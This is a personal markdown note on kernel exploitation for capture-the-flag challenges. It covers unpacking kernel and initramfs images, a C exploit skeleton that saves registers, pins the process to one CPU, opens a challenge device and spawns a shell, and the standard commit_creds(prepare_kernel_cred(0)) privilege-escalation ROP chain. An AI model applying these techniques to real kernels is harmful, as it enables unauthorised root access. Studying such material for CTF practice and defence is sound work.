# Kernel pwn notes

Collection of kernel pwn notes I made for myself, feel free to refer!

## Setup

* `vmlinuz`

Contains the compressed kernel, can decompress with `extract-image.sh`

`extract-image.sh ./vmlinuz | save ./vmlinux`

Find symbols: [https://github.com/marin-m/vmlinux-to-elf]

* `initramfs.cpio.gz`

Filesystem, `gunzip` first then unserialize with `cpio`

Can repack with `compress.sh exploit.c`

```bash
gunzip initramfs.cpio.gz
cat initramfs.cpio | cpio -idm
```

https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/

* Script

Useful pre-exploit initialization

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdarg.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sched.h>

int fd = 0;
 
void pprintf(char *str, ...) {
  printf("[*] ");
  va_list args;
  va_start(args, str);
  vprintf(str, args);
  printf("\n");
}
 
void pprintfc(char *str, ...) {
  printf("\33[2K\r[*] ");
  va_list args;
  va_start(args, str);
  vprintf(str, args);
}
 
 
void ppause(char *str, ...) {
  printf("[-] ");
  va_list args;
  va_start(args, str);
  vprintf(str, args);
  printf("\n");
  getchar();
}
 
void open_dev() {
  fd = open("/dev/chall", O_RDWR);
}
 
size_t user_cs, user_ss, user_sp, user_rflags;
void save_state() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;"
  );
}
 
void get_shell() {
  system("/bin/sh");
}

cpu_set_t cpu_set;
int main() {
  // save registers
  save_state();
 
  CPU_ZERO(&cpu_set);
  CPU_SET(0, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

  open_dev();
  pprintf("opened device on fd %d, starting exploit", fd);
}
```

Common ROP chain:

```c
commit_creds(prepare_kernel_cred(0))
commit_creds(prepare_kernel_cred(&init_task))
```
